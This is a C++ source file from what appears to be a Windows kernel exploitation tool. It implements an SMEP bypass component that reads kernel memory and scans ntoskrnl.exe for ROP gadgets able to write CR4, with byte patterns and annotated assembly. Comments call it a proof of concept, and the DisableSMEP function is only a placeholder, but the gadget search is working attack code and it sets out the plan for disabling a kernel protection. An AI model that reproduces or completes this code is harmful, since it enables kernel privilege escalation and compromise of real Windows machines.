#include "SMEPBypass.h"
#include <vector>
#include <string>

namespace KernelMode {

    SMEPBypass::SMEPBypass(std::shared_ptr<Providers::IProvider> provider) 
        : provider(provider), ntoskrnlBase(0), originalCr4(0) {
        gadgets = { 0 };
    }

    bool SMEPBypass::Initialize() {
        if (!provider) return false;

        ntoskrnlBase = Utils::GetKernelModuleBase("ntoskrnl.exe");
        if (!ntoskrnlBase) {
            std::wcerr << L"[-] Failed to get ntoskrnl base" << std::endl;
            return false;
        }

        std::wcout << L"[*] Scanning ntoskrnl for ROP gadgets..." << std::endl;

        // Pattern for "pop rcx; ret" (59 C3)
        // 59                   pop     rcx
        // C3                   retn
        gadgets.PopRcxRet = FindGadget({ 0x59, 0xC3 }, "xx");
        
        // Pattern for "mov cr4, rcx; ret" (0F 22 E1 C3)
        // 0F 22 E1             mov     cr4, rcx
        // C3                   retn
        gadgets.MovCr4RcxRet = FindGadget({ 0x0F, 0x22, 0xE1, 0xC3 }, "xxxx");

        // Pattern for "pop rax; ret" (58 C3)
        // 58                   pop     rax
        // C3                   retn
        gadgets.PopRaxRet = FindGadget({ 0x58, 0xC3 }, "xx");

        // Pattern for "mov cr4, rax; ret" (0F 22 E0 C3)
        // 0F 22 E0             mov     cr4, rax
        // C3                   retn
        gadgets.MovCr4RaxRet = FindGadget({ 0x0F, 0x22, 0xE0, 0xC3 }, "xxxx");

        // We need at least one pair (RCX or RAX)
        if ((gadgets.PopRcxRet && gadgets.MovCr4RcxRet) || (gadgets.PopRaxRet && gadgets.MovCr4RaxRet)) {
            gadgets.Found = true;
            std::wcout << L"[+] SMEP bypass gadgets found!" << std::endl;
            if (gadgets.PopRcxRet) std::wcout << L"    pop rcx; ret: 0x" << std::hex << gadgets.PopRcxRet << std::endl;
            if (gadgets.MovCr4RcxRet) std::wcout << L"    mov cr4, rcx; ret: 0x" << std::hex << gadgets.MovCr4RcxRet << std::endl;
            return true;
        }

        std::wcerr << L"[-] Failed to find necessary ROP gadgets" << std::endl;
        return false;
    }

    uintptr_t SMEPBypass::FindGadget(const std::vector<uint8_t>& pattern, const std::string& mask) {
        // --- BUG-M019 FIX: Validate pattern and mask sizes match ---
        if (pattern.size() != mask.size()) {
            std::wcerr << L"[-] Pattern/mask size mismatch: pattern=" << pattern.size() 
                       << L", mask=" << mask.size() << std::endl;
            return 0;
        }
        if (pattern.empty()) {
            std::wcerr << L"[-] Empty pattern provided" << std::endl;
            return 0;
        }
        // -----------------------------------------------------------
        
        // Simple scan of .text section of ntoskrnl
        // In a real implementation we would parse sections. Here we scan first 8MB.
        const size_t SCAN_SIZE = 8 * 1024 * 1024;
        const size_t CHUNK_SIZE = 0x1000;
        
        // --- BUG-C007 FIX: Use overlapping chunks to catch patterns at boundaries ---
        const size_t OVERLAP = pattern.size() - 1; // Overlap by pattern size minus 1
        std::vector<uint8_t> buffer(CHUNK_SIZE + OVERLAP);
        size_t consecutiveFailures = 0;
        const size_t MAX_CONSECUTIVE_FAILURES = 10;

        for (size_t offset = 0; offset < SCAN_SIZE; offset += CHUNK_SIZE) {
            // Read chunk with overlap from previous chunk
            size_t readSize = (offset + CHUNK_SIZE + OVERLAP <= SCAN_SIZE) ? (CHUNK_SIZE + OVERLAP) : (SCAN_SIZE - offset);
            
            // --- BUG-H013 FIX: Track and log read failures ---
            if (!provider->ReadKernelMemory(ntoskrnlBase + offset, buffer.data(), readSize)) {
                consecutiveFailures++;
                if (consecutiveFailures >= MAX_CONSECUTIVE_FAILURES) {
                    std::wcerr << L"[-] Too many consecutive memory read failures (" 
                               << consecutiveFailures << L"), aborting scan" << std::endl;
                    return 0;
                }
                continue;
            }
            consecutiveFailures = 0; // Reset on successful read
            // ----------------------------------------------------

            // Brute force search in chunk (now includes overlap region)
            size_t searchLimit = readSize - pattern.size() + 1;
            for (size_t i = 0; i < searchLimit; ++i) {
                bool match = true;
                for (size_t j = 0; j < pattern.size(); ++j) {
                    if (mask[j] == 'x' && buffer[i + j] != pattern[j]) {
                        match = false;
                        break;
                    }
                }
                
                if (match) {
                    return ntoskrnlBase + offset + i;
                }
            }
        }
        return 0;
    }

    // NOTE: Actual execution of these gadgets requires stack control (ROP).
    // The current architecture creates a NEW system thread, which has a fresh stack.
    // To use these gadgets, we would need to hijack a thread's stack or use 
    // a vulnerability that allows ROP chains (like a stack overflow or a specific hook).
    //
    // For this POC, finding the gadgets demonstrates the feasibility of the bypass.
    // Implementing the full chain execution via CreateSystemThread is non-trivial without 
    // a "pivot" gadget that treats the StartContext as a stack pointer (e.g., xchg rsp, rcx).
    
    bool SMEPBypass::DisableSMEP() {
        // Implementation placeholder for ROP chain execution logic
        return gadgets.Found;
    }

    bool SMEPBypass::EnableSMEP() {
        return true;
    }
}
